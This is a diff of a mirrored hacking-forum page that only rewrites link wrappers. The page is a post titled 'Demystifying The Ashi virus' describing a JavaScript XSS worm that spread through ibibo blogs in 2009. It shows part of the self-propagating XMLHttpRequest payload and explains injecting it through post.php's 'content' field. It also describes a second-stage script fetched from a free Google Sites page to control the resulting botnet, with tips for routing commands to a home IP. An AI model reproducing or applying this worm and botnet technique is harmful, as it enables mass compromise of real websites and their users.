@@ -39,8 +39,8 @@
 	}
 	else	// Load Rest of YUI remotely (where possible)
 	{
-		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
-		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = 'http://yui.yahooapis.com/combo';
 		var remoteyui = true;
 		if (!yuicombopath)
 		{
@@ -649,7 +649,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 						<blockquote class="postcontent restore">
 							<div style="text-align: center;"><b>Demystifying The Ashi virus</b> - <br/>
 Author:- <b>"vinnu"</b></div><br/>
-Today I will post the deveopment of "ashi" virus used by vinnu bro for exploiting several XSS vulnerabilities in ibibo blogs in <b>August 2009</b>. The virus was developed in javascript. It affected the ibibo blogs widely. So in the end I will post some pics to show the havoc it caused <img alt="" border="0" class="inlineimg" src="images/smilies/biggrin.png" title="Big Grin"/>. Starting the post as explained by vinnu bhai [<a href="../external.html?link=http://www.orkut.co.in/Main#CommMsgs?cmm=25319870&amp;tid=5371534362398495724]" target="_blank">http://www.orkut.co.in/Main#CommMsgs...4362398495724]</a><br/>
+Today I will post the deveopment of "ashi" virus used by vinnu bro for exploiting several XSS vulnerabilities in ibibo blogs in <b>August 2009</b>. The virus was developed in javascript. It affected the ibibo blogs widely. So in the end I will post some pics to show the havoc it caused <img alt="" border="0" class="inlineimg" src="images/smilies/biggrin.png" title="Big Grin"/>. Starting the post as explained by vinnu bhai [<a href="http://www.orkut.co.in/Main#CommMsgs?cmm=25319870&amp;tid=5371534362398495724]" target="_blank">http://www.orkut.co.in/Main#CommMsgs...4362398495724]</a><br/>
 -----------------------------------------------------------------------------------<br/>
 I found several XSS vulnerabilities in ibibo.com.Next, i searched for any good point which can give me a point to automate the leveraging process. I found two php pages post.php and new-post.php, which can submit my blog posts and both the title as well as the content were prone to XSS. So i developed a script to find out the form elements:<br/>
 <br/>
@@ -970,7 +970,7 @@ var xmlhttp; if (window.XMLHttpRequest){xmlhttp = new XMLHttpRequest();} else if
 try{xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}catch(e){try{x  mlhttp = new ActiveXObject("Msxml2.XMLHTTP");}catch(e){return;}  }}alert("sending");xmlhttp.open("POST", url, true);<br/>
 xmlhttp.setRequestHeader("Content-Type","application/x-www-formurlencoded");xmlhttp.setRequestHeader("Content-length", payload.length);alert("sending:\t"+payload.length)  ;xmlhttp.send(payload);alert("sent");};<br/>
 <br/>
-But i thought the title was not a good place to inject the codeas it will appear in dashboard. So I placed the code in the argument of post.php named "content" instead of "post_title".The variable "nunnu" contains the code for a script which retrieves the remote javascript file at:<a href="../accounts.google.com/ServiceLogin3641.html" target="_blank">http://sites.google.com/site/urcontrolledsite/ibibo.js</a> .This is a google's free page uploading facility(<a href="../external.html?link=http://sites.google.com/site).I" target="_blank">http://sites.google.com/site).I</a> loaded the .js file as an attatchment. But it contained nothing initially.It was meant for controlling the Botnet and commanding it later in forming the XSS tunnels. It was the second stage of two staged botnet formation.<br/>
+But i thought the title was not a good place to inject the codeas it will appear in dashboard. So I placed the code in the argument of post.php named "content" instead of "post_title".The variable "nunnu" contains the code for a script which retrieves the remote javascript file at:<a href="../accounts.google.com/ServiceLogin3641.html" target="_blank">http://sites.google.com/site/urcontrolledsite/ibibo.js</a> .This is a google's free page uploading facility(<a href="http://sites.google.com/site).I" target="_blank">http://sites.google.com/site).I</a> loaded the .js file as an attatchment. But it contained nothing initially.It was meant for controlling the Botnet and commanding it later in forming the XSS tunnels. It was the second stage of two staged botnet formation.<br/>
 <br/>
 Note: The third party free sites are also useful to connect to a botnet ifyou do not have any dedicated server. In ur script file at free site like google,you can place a script that can redirect the requests to ur home computer. This can be achieved by using a simplest &lt;script&gt; tag with its "src" attribute defined to ur home computer's current IP address. But this makes it necessary to remove such redirector scripts or change the IP address everytime you get a new IP address or disconnect.Otherwise, the botnet will be orphaned or will end up in chaos.<br/>
 <br/>
